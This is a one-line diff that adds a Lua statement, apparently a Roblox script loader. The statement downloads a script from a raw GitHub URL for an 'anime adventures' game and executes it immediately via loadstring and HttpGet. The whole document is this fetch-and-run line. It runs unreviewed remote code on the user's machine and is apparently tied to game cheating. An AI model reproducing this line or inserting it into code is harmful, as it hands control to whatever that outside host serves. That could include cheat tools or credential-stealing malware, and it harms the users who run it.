@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/april-fool-s-anime-adventures-spam7-xbi2p1qyoo1cbm.lua"))()
